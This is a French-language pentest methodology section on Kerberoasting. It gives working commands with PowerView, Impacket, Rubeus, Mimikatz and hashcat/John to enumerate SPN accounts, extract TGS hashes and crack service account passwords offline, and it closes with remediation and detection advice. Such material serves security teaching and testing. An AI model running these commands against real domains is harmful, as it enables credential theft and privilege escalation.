# V.B. Kerberoasting

Le Kerberoasting est une technique d'attaque post-exploitation qui cible les comptes de service Active Directory. Si un compte de service a un Service Principal Name (SPN) enregistré et utilise Kerberos pour l'authentification, un utilisateur du domaine (même avec peu de privilèges) peut demander un ticket de service Kerberos (TGS) pour ce service. La partie chiffrée de ce TGS est chiffrée avec le hash NTLM du compte de service. Ce ticket peut être extrait et son hash craqué hors ligne.

Si le mot de passe du compte de service est faible, il peut être retrouvé, compromettant potentiellement le service et les systèmes auxquels il a accès.

## 1. Identification des Comptes Kerberoastables

*   **Objectif :** Trouver les comptes utilisateurs (pas les comptes machines) qui ont des SPNs configurés.
*   **Outils et Commandes :**

    *   **PowerView (Windows) :**
        ```powershell
        # Lister tous les SPNs pour les comptes utilisateurs
        Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof, description, pwdlastset, lastlogon
        # Plus ciblé, excluant les comptes désactivés et les comptes machines (qui ont souvent des SPNs mais sont moins intéressants pour le kerberoasting classique)
        Get-DomainUser -SPN -Properties samaccountname, serviceprincipalname, memberof, description, pwdlastset, lastlogon | Where-Object {$_.Enabled -eq $True -and $_.samaccountname -notlike "*-*" -and $_.samaccountname -notlike "*$"}
        ```

    *   **Module ActiveDirectory PowerShell :**
        ```powershell
        Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, MemberOf, Description, SamAccountName, Enabled, PwdLastSet, LastLogonTimestamp | Where-Object {$_.Enabled -eq $True} | Select-Object SamAccountName, ServicePrincipalName, @{N="LastLogon"; E={[datetime]::FromFileTime($_.LastLogonTimestamp)}}, @{N="PwdLastSet";E={[datetime]::FromFileTime($_.PwdLastSet)}}, Description, MemberOf
        ```

    *   **GetUserSPNs.py (Impacket - Linux) :**
        ```bash
        # Depuis une machine Linux avec des identifiants valides
        GetUserSPNs.py -request -dc-ip <IP_DC> <DOMAINE.LOCAL>/<utilisateur>:<mot_de_passe>
        # Pour sauvegarder les hashes au format Hashcat
        GetUserSPNs.py -request -dc-ip <IP_DC> <DOMAINE.LOCAL>/<utilisateur>:<mot_de_passe> -outputfile kerberoast_hashes.txt
        # Avec un hash NTLM au lieu d'un mot de passe
        GetUserSPNs.py -request -dc-ip <IP_DC> <DOMAINE.LOCAL>/<utilisateur> -hashes <LM_HASH>:<NT_HASH> -outputfile kerberoast_hashes.txt
        ```

    *   **Rubeus (Windows) :**
        ```powershell
        # Lister et demander les TGS pour les comptes kerberoastables
        Rubeus.exe kerberoast /outfile:kerberoast_hashes_rubeus.txt /format:hashcat
        # Pour un utilisateur spécifique
        Rubeus.exe kerberoast /user:<NOM_COMPTE_SERVICE> /outfile:single_kerb_hash.txt /format:hashcat
        # Si vous avez déjà une liste de SPNs
        # Rubeus.exe kerberoast /spn:"HTTP/webserver.domaine.local" /outfile:spn_hash.txt
        ```

## 2. Extraction des Tickets de Service (TGS)

Les outils ci-dessus (GetUserSPNs.py, Rubeus) effectuent généralement l'identification et l'extraction en une seule étape. Si vous utilisez des méthodes manuelles ou d'autres outils, le processus implique :
1.  Identifier le SPN.
2.  Demander un TGS pour ce SPN au KDC (Contrôleur de Domaine).
3.  Extraire le ticket de la mémoire ou du trafic réseau.

*   **Mimikatz (pour extraire les tickets en mémoire, si vous avez déjà un TGS pour le service) :**
    ```
    privilege::debug
    sekurlsa::tickets /export
    # Chercher les tickets correspondant aux SPNs identifiés.
    ```
    Note : Mimikatz est plus souvent utilisé pour extraire des TGTs ou des tickets déjà présents. Pour le kerberoasting, Rubeus ou GetUserSPNs sont plus directs.

## 3. Craquage des Hashes Kerberos (TGS)

Les hashes extraits sont généralement de type KRB5TGS (mode Hashcat 13100).

*   **Hashcat :**
    ```bash
    # hashcat -m 13100 <fichier_hashes_kerberoast> <liste_de_mots_de_passe>
    hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
    hashcat -m 13100 kerberoast_hashes.txt rockyou.txt -O # Optimisation
    ```
*   **John the Ripper :**
    ```bash
    # john --format=krb5tgs --wordlist=rockyou.txt kerberoast_hashes.txt
    ```

## Impact et Remédiation

*   **Impact :**
    *   Compromission de comptes de service.
    *   Accès aux applications et systèmes gérés par ces comptes (bases de données, applications web, tâches planifiées, etc.).
    *   Potentielle élévation de privilèges si le compte de service a des droits élevés.
*   **Remédiation :**
    *   **Mots de passe forts et uniques :** Utiliser des mots de passe longs (25+ caractères), complexes et uniques pour les comptes de service.
    *   **Comptes de Service Managés (MSA/gMSA) :** Préférer les Group Managed Service Accounts (gMSA) ou Managed Service Accounts (MSA) lorsque possible. Windows gère automatiquement leurs mots de passe, les rendant très longs et complexes, et les change régulièrement. Ils ne peuvent pas être utilisés pour des connexions interactives.
    *   **Principe de moindre privilège :** Accorder aux comptes de service uniquement les permissions nécessaires à leur fonctionnement.
    *   **Surveillance :** Surveiller les demandes de TGS inhabituelles ou excessives (peut indiquer une tentative de kerberoasting). Les événements Kerberos 4769 sur les DCs peuvent être analysés.
    *   **Limiter l'utilisation de comptes utilisateurs standards comme comptes de service.**

Le Kerberoasting est une attaque discrète car elle n'implique pas d'interaction directe avec le service cible, seulement avec le KDC. 